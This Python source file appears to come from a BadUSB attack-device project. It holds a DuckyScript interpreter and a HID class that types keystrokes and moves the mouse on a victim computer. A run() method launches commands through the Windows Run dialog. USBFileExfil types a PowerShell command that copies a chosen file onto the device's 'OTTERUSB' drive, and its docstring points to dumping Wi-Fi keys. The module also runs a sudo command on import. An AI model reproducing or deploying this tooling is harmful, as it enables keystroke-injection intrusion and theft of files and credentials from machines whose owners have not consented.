import datetime
import json
import math
import threading
from time import sleep
import os
from random import randint, gauss

import jinja2
import core.badusb.keys as usbKeys
from core.utils import config
import select

class DuckyScriptInterpreter():
    """
    a crude, shitty duckyscript implementation
    """
    def __init__(self, usb, file, draw, disp, image):
        self.usb = usb
        self.file = file
        self.fileData = open(file, "r").read().split("\n")

        self.draw = draw
        self.disp = disp
        self.image = image

        self.key = { # key for things
            "STRING": self.STRING,
            "STRINGLN": self.STRINGLN,
            "REM": self.REM,
            "ALT": self.ALT,
            "CTRL": self.CTRL,
            "SHIFT": self.SHIFT,
            "GUI": self.GUI,
            "DELAY": self.DELAY,
            "HOLD": self.HOLD,
            "RELEASE": self.RELEASE,
            "JITTER": self.JITTER,
            "PRINT": self.PRINT,
            "PRESS": self.PRESS,
            "MOVE": self.MOVE,
            "MOUSEPRESS": self.MOUSEPRESS,
            "MOUSEHOLD": self.MOUSEHOLD,
            "MOUSERELEASE": self.MOUSERELEASE
        }

        self.vars = {}
        self.jitter = False
        self.percentage = 0
        self.printed = ''

        self.handler = disp.gui.usbRunPercentage(draw,disp,image) # init handler
        threading.Thread(target=self.handler.start,daemon=True).start() # start handler
        self.handler.setPercentage(0)

        return

    def parse(self):
        indexesToRemove = []
        index = 0

        for x in self.fileData:
            if x.split(" ")[0].upper() == "VAR":
                varname, varval = x.split(" ")[1], x.split(" ")[3]
                os.environ[varname] = varval
                indexesToRemove.append(self.fileData.index(x))
        
        for x in indexesToRemove:
            self.fileData.pop(x)

        template = jinja2.Template('\n'.join(self.fileData))
        output = template.render(os.environ).split("\n")

        print(output)

        for ln in output:
            index += 1

            if len(ln) == 0: continue
            if ln[0] == "#": continue

            print("{}: {}".format(index, ln))

            base, line = ln.split(" ", 1)
            if base in self.key:
                self.key[base](line.split(" "))

            # this is painful
            self.handler.setPercentage(math.floor((index / len(self.fileData)) * 100)) # set percentage

        self.handler.addText("finished")
        
    def STRING(self, splitLine:list):
        ln = ' '.join(splitLine)
        if "![$" in ln:
                b, c = ln.split("![$")
                val = ""

                for x in [x for x in c]:
                    if x == "]":
                        break
                    val += x
                
                ln = ln.replace("![${}]".format(val), os.environ.get(val, ""))

        self.usb.write(ln, jitter=self.jitter)

    def STRINGLN(self, splitLine:list):
        ln = ' '.join(splitLine)
        if "![$" in ln:
                b, c = ln.split("![$")
                val = ""

                for x in [x for x in c]:
                    if x == "]":
                        break
                    val += x

                print("-" * 20 + val)
                print(os.environ.get(val, ""))

                ln = ln.replace("![${}]".format(val), os.environ.get(val, ""))

        self.usb.write(ln, jitter=self.jitter)
        self.usb.press('ENTER')
        
    def REM(self):
        return
    
    def PRESS(self, splitLine:list):
        self.usb.press(splitLine[0])

    def ALT(self, splitLine:list):
        if len(splitLine) > 1:
            noRelease = True
        else:
            noRelease = False

        self.usb.alt(splitLine[0], noRelease=noRelease)

        splitLine.pop(0)

        if len(splitLine) > 0:
            for key in splitLine:
                self.usb.press(key)

        if noRelease:
            self.usb.releaseAll()

    def CTRL(self, splitLine:list):
        if len(splitLine) > 1:
            noRelease = True
        else:
            noRelease = False

        self.usb.ctrl(splitLine[0], noRelease=noRelease)

        splitLine.pop(0)

        if len(splitLine) > 0:
            for key in splitLine:
                self.usb.press(key)

        if noRelease:
            self.usb.releaseAll()

    def SHIFT(self, splitLine:list):
        if len(splitLine) > 1:
            noRelease = True
        else:
            noRelease = False

        self.usb.shift(splitLine[0], noRelease=noRelease)

        splitLine.pop(0)

        if len(splitLine) > 0:
            for key in splitLine:
                self.usb.press(key)

        if noRelease:
            self.usb.releaseAll()

    def GUI(self, splitLine:list):
        if len(splitLine) > 1:
            noRelease = True
        else:
            noRelease = False

        self.usb.gui(splitLine[0], noRelease=noRelease)

        splitLine.pop(0)

        if len(splitLine) > 0:
            for key in splitLine:
                self.usb.press(key)

        if noRelease:
            self.usb.releaseAll()

    def DELAY(self, splitLine:list):
        sleep(float(splitLine[0]))

    def HOLD(self, splitLine:list):
        self.usb.press(splitLine[0], noRelease=True)

    def RELEASE(self, splitLine:list):
        self.usb.releaseAll()

    def JITTER(self, splitLine:list):
        try:
            self.jitter = (float(splitLine[0]), float(splitLine[1]))
        except IndexError:
            self.jitter = False

    def PRINT(self, splitLine:list):
        self.handler.addText(' '.join(splitLine))

    def MOVE(self, splitLine:list):
        self.usb.move(int(splitLine[0]), int(splitLine[1]))

    def MOUSEPRESS(self, splitLine:list):
        self.usb.mousePress(int(splitLine[0]))

    def MOUSEHOLD(self, splitLine:list):
        self.usb.mouseHold(int(splitLine[0]))

    def MOUSERELEASE(self, splitLine:list):
        self.usb.mouseRelease()

    def run(self, script):
        file = open(script, "r").read().split("\n")
        for ln in file:
            line = ln.split(" ")
            base = line[0]
            line.pop(0)

            if "![$" in ln: # this is "truly" the best way to find shit
                b, c = ln.split("![$")
                val = ""

                for x in [x for x in c]:
                    if x == "]":
                        break
                    val += x
                
                ln = ln.replace("![${}]".format(val), os.environ.get(val, ""))

            currIndex = file.index(ln)

            self.percentage = round(100 - float(
                    str( # turn decimal percentage into a string
                        "{:.0%}".format(
                            currIndex/len(
                                file # make decimal percentage
                            )
                        )
                    ).replace("%", "") # remove percentage sign
                ) # turn string back into float
            ) # round it up

            if base in self.key:
                self.key[base](line)


class BadUSB:
    def __init__(self, kbHidDirectory:str=config["badusb"]["keyboardPath"], mouseHidDirectory:str=config["badusb"]["mousePath"], hidWriteType:str='rb+'):
        if os.path.exists(kbHidDirectory):
            pass
        else:
            raise FileNotFoundError("\"{}\" doesn't exist")

        if os.path.exists(mouseHidDirectory):
            pass
        else:
            raise FileNotFoundError("\"{}\" doesn't exist")

        self.kbHidDirectory = kbHidDirectory
        self.mouseHidDirectory = mouseHidDirectory
        self.writeType=hidWriteType

        self.keyboard = open(self.kbHidDirectory, self.writeType)

        self.keys = usbKeys.keys
        self.shifted = usbKeys.shifted
        self.symbols = usbKeys.symbols

        self.capsLock = False
        self.scrollLock = False
        self.numLock = False

        threading.Thread(target=self.toggleCheck, daemon=True).start()

    def isUpper(self, string:str): return True if string.upper() == string else False

    def toggleCheck(self, hz=2048):
        numLockValue = 1
        capsLockValue = 2
        scrollLockValue = 4
        while True:
            r, w, e = select.select([ self.keyboard ], [], [], 0)
            if self.keyboard in r:
                a = int.from_bytes(self.keyboard.read(1), byteorder='little')

                if a == 0: # null/nothing toggled on
                    self.capsLock = False
                    self.scrollLock = False
                    self.numLock = False

                # base

                elif a == capsLockValue:
                    self.capsLock = True
                    self.scrollLock = False
                    self.numLock = False

                # num
                    

                elif a == numLockValue:
                    self.numLock = True
                    self.capsLock = False
                    self.scrollLock = False

                elif a == numLockValue + capsLockValue:
                    self.numLock = True
                    self.capsLock = True
                    self.scrollLock = False

                # scrl
                elif a == 4:
                    self.scrollLock = True
                    self.capsLock = False
                    self.numLock = False

                elif a == 6:
                    self.scrollLock = True
                    self.capsLock = True
                    self.numLock = False

                elif a == 4 + numLockValue:
                    self.scrollLock = True
                    self.numLock = True
                    self.capsLock = False
                
                elif a == 7:
                    self.numLock = True
                    self.capsLock = True
                    self.scrollLock = True

            sleep(1/hz)

    def kbRawWrite(self, direct, useAdditives=False):
        """
        write exact given arg directly to hid serial
        """

        if not useAdditives:
            self.keyboard.write(direct)
        else:
            text = self.keys["null"]*2+chr(direct)+self.keys["null"]*5
            self.keyboard.write(text.encode())

        self.keyboard.flush()

    def mouseRawWrite(self, direct, useAdditives=False):
        """
        write exact given arg directly to hid serial
        """

        #print(type(direct.encode()))

        with open(self.mouseHidDirectory, "wb+") as mouse:
            if not useAdditives:
                mouse.write(direct)
            else:
                mouse.write(direct.encode())

            #mouse.flush()

        sleep(0.5)

    def write(self, string, keyDelay=0, jitter=False, pressDelay=0):
        """
        write a string, case sensitive, with a set keyDelay
        """
        for x in [str(x) for x in string]:       
            self.press(x, releaseDelay=pressDelay)

            if jitter != False:
                g = gauss(jitter[0], jitter[1])

                if g < 0:
                    g = g * -1

                sleep(g)
            else:
                sleep(keyDelay)
        return True
    
    def move(self, xPx:int, yPx:int):
        """
        move the mouse x,y
        """
        
        chars = []

        # anything past 128 makes it go back
        if xPx < 0:
            print("x axis negative")
            xPx = xPx*-1 + 127
        
        if yPx < 0:
            print("y axis negative")
            yPx = yPx*-1 + 127
        
        print("{}, {}".format(xPx, yPx))

        # TODO: make it -254 from the actual value instead of just doing 254

        if xPx > 254:
            b = xPx
            for x in range(round(xPx/254)):
                chars.append((254, 0))
        if yPx > 254:
            b = yPx
            for x in range(round(yPx/254)):
                print('a')
                chars.append((0, 254))
        if yPx < 254 and xPx < 254:
            chars.append((xPx, yPx))

        # ima be 100 percent with whoever is reading this
        # i am so dumb i needed chatgpt to help me
        #byte_data = bytes.fromhex(''.join(['\\x', hex(xPx)[2:]]))

        #self.mouseRawWrite(b"\x00" + chr(xPx).encode() + chr(yPx).encode(), useAdditives=False)
        for x,y in chars:

            # theres a better way of doing this i just dont know it
            if len(hex(x)[2:]) == 1:
                hexiX = "0" + hex(x)[2:]
            else:
                hexiX = hex(x)[2:]

            if len(hex(y)[2:]) == 1:
                hexiY = "0" + hex(y)[2:]
            else:
                hexiY = hex(y)[2:]

            print("-" * 10)
            print(hexiX)
            print(hexiY)

            self.mouseRawWrite(b'\x00'+ eval('b"' + r'\x' + hexiX + '"') + eval('b"' + r'\x' + hexiY + '"'), useAdditives=False)

    def mousePress(self, button:int):
        """
        press buttons 1, 2, 3
        """
        self.mouseRawWrite(chr(button).encode() + b'\x00\x00', useAdditives=False)
        self.mouseRawWrite(b"\x00\x00\x00", useAdditives=False)

    def mouseHold(self, button:int):
        """
        hold buttons 1, 2, 3
        """
        self.mouseRawWrite(chr(button).encode() + b'\x00\x00', useAdditives=False)

    def mouseRelease(self):
        """
        release all buttons
        """
        self.mouseRawWrite(b"\x00\x00\x00", useAdditives=False)

    def releaseAll(self):
        """
        release all pressed keys, always called after self.press() and self.write()
        """
        a = self.keys['null']*8
        self.kbRawWrite(a.encode())

    def press(self, key, releaseDelay=0):
        """
        press a certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            #print("is list")
            text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt[0])+self.keys["null"]*5
            self.kbRawWrite(text.encode())
        else:
            if not key == key.upper(): # if lowercase
                #print("is lower")
                self.kbRawWrite(keyInt, useAdditives=True)
            elif key in list(self.symbols):
                #print("is special")
                self.kbRawWrite(keyInt, useAdditives=True)
            else: # if uppercase
                #print("is upper")
                text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())

        sleep(float(releaseDelay))

        self.releaseAll()
        return True

    def ctrl(self, key, noRelease:bool=False):
        """
        ctrl + certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            pass # no
        else:
            if not key == key.upper(): # if lowercase
                text = chr(self.keys["LCTRL"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())
            elif key in list(self.symbols):
                text = chr(self.keys["LCTRL"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())
            else: # if uppercase, it doesnt matter
                text = chr(self.keys["LCTRL"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())

        if not noRelease:
            self.releaseAll()
        
        return True

    def shift(self, key, noRelease:bool=False):
        """
        shift + certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            pass # no
        else:
            if not key == key.upper(): # if lowercase
                text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())
            elif key in list(self.symbols):
                text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())
            else: # if uppercase, it doesnt matter
                text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())

        if not noRelease:
            self.releaseAll()
        
        return True

    def alt(self, key, noRelease:bool=False):
        """
        alt + certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            pass # no
        else:
            if not key == key.upper(): # if lowercase
                text = chr(self.keys["LALT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())
            elif key in list(self.symbols):
                text = chr(self.keys["LALT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())
            else: # if uppercase, it doesnt matter
                text = chr(self.keys["LALT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())

        if not noRelease:
            self.releaseAll()
        
        return True

    def gui(self, key, noRelease:bool=False):
        """
        gui (or meta) + certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            pass # no
        else:
            if not key == key.upper(): # if lowercase
                text = chr(self.keys["LMETA"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())
            elif key in list(self.symbols):
                text = chr(self.keys["LMETA"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())
            else: # if uppercase, it doesnt matter
                text = chr(self.keys["LMETA"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.kbRawWrite(text.encode())

        if not noRelease:
            self.releaseAll()
        
        return True

    def run(self, string, enter=True):
        """
        use GUI+R to run something, automatically presses enter
        """

        text = chr(self.keys["LMETA"]) + self.keys["null"] + chr(self.keys["r"])+self.keys["null"]*5

        self.kbRawWrite(text.encode())

        sleep(0.25)

        self.write(string, keyDelay=0)

        sleep(0.1)

        if enter:
            self.press("ENTER")

        return True

    def USBFileExfil(self, filename, 
        exfilFileName="{}.txt".format(datetime.datetime.now()),
        exfilVolumeName:str="OTTERUSB",
        ):
        """exfil a file to onboard USB drive;\
            leave command empty if you want to just exfiltrate file;\
            put command if you want to do a special command like netsh wlan key show (or however it goes)
            """

        fullCmd = 'powershell "$m=(Get-Volume -FileSystemLabel \'{}\'). DriveLetter; type {}>>$m\':\{}\'"'.format(exfilVolumeName, filename, exfilFileName)

        return self.run(fullCmd)
    
    def close(self):
        """
        close the badusb stream
        """

        self.keyboard.close()
        self.keyboard = None
        return None
    
os.system("sudo /bin/pwnhyveusb")